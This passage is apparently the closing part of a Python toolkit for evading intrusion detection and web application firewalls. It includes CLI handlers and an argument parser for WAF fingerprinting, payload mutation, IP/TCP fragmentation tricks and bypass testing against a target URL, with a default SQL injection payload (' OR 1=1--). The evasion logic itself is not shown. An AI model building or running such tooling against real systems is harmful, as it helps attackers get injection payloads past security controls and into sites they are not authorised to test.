            C.info(f"  Fragment {i}: {repr(f)[:120]}")
        if len(frags) > 5:
            C.info(f"  ... and {len(frags) - 5} more")

def _cli_test(args: argparse.Namespace) -> None:
    C.banner("Evasion Testing")
    tester = EvasionTester(timeout=args.timeout)
    if args.benchmark:
        tester.benchmark(args.url)
        return
    techs = args.techniques.split(",") if args.techniques else None
    results = tester.test_bypass(args.url, args.payload, techniques=techs)
    C.p(f"\n  {C.BLD}Results:{C.R}")
    for r in results:
        st = f"{C.GRN}BYPASS{C.R}" if not r.blocked else f"{C.RED}BLOCKED{C.R}"
        C.p(f"\n  [{st}] {C.CYN}{r.technique}{C.R}")
        C.p(f"    HTTP {r.response_code} | {r.latency_ms:.0f}ms")
        C.p(f"    Payload: {r.payload_sent[:80]}")
        if r.response_snippet:
            C.p(f"    Response: {C.DIM}{r.response_snippet[:100]}{C.R}")
    bypassed = sum(1 for r in results if not r.blocked)
    C.p(f"\n  {C.BLD}Summary: {bypassed}/{len(results)} bypassed{C.R}")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="ids_evasion",
        description="IDS/IPS/WAF Detection & Evasion Toolkit - FLLC",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="command", help="Available commands")

    w = sub.add_parser("waf-detect", help="Fingerprint WAF on target URL")
    w.add_argument("--url", required=True); w.add_argument("--timeout", type=float, default=10.0)
    w.add_argument("--verbose", "-v", action="store_true")

    i = sub.add_parser("ids-detect", help="Detect IDS/IPS on network path")
    i.add_argument("--target", required=True); i.add_argument("--port", type=int, default=80)
    i.add_argument("--timeout", type=float, default=5.0); i.add_argument("--iterations", type=int, default=5)
    i.add_argument("--verbose", "-v", action="store_true")

    mu = sub.add_parser("mutate", help="Mutate/encode payloads for evasion")
    mu.add_argument("--payload", required=True); mu.add_argument("--technique", "-t")
    mu.add_argument("--auto", action="store_true"); mu.add_argument("--waf")
    mu.add_argument("--verbose", "-v", action="store_true")

    fr = sub.add_parser("fragment", help="Fragment payloads at network level")
    fr.add_argument("--target", required=True); fr.add_argument("--port", type=int, default=80)
    fr.add_argument("--payload", default="GET / HTTP/1.1\r\nHost: test\r\n\r\n")
    fr.add_argument("--method", choices=["ip", "overlap", "ttl", "tcp", "splice"], default="ip")
    fr.add_argument("--size", type=int, default=8); fr.add_argument("--ids-ttl", type=int, default=10)
    fr.add_argument("--target-ttl", type=int, default=64); fr.add_argument("--delay", type=float, default=0.5)
    fr.add_argument("--send", action="store_true"); fr.add_argument("--verbose", "-v", action="store_true")

    te = sub.add_parser("test", help="Test evasion effectiveness")
    te.add_argument("--url", required=True); te.add_argument("--payload", default="' OR 1=1--")
    te.add_argument("--techniques"); te.add_argument("--benchmark", action="store_true")
    te.add_argument("--timeout", type=float, default=10.0); te.add_argument("--verbose", "-v", action="store_true")
    return p


# =============================================================================
#  ENTRY POINT
# =============================================================================

def main() -> None:
    C.banner("FU PERSON :: IDS/IPS/WAF EVASION TOOLKIT v1.0")
    C.p(f"  {C.DIM}requests: {'available' if HAS_REQUESTS else 'not installed (urllib fallback)'}")
    C.p(f"  scapy:    {'available' if HAS_SCAPY else 'not installed (fragmentation disabled)'}{C.R}\n")

    parser = build_parser()
    args = parser.parse_args()
    dispatch: Dict[str, Callable[[argparse.Namespace], None]] = {
        "waf-detect": _cli_waf_detect, "ids-detect": _cli_ids_detect,
        "mutate": _cli_mutate, "fragment": _cli_fragment, "test": _cli_test,
    }
    handler = dispatch.get(args.command)
    if handler:
        handler(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
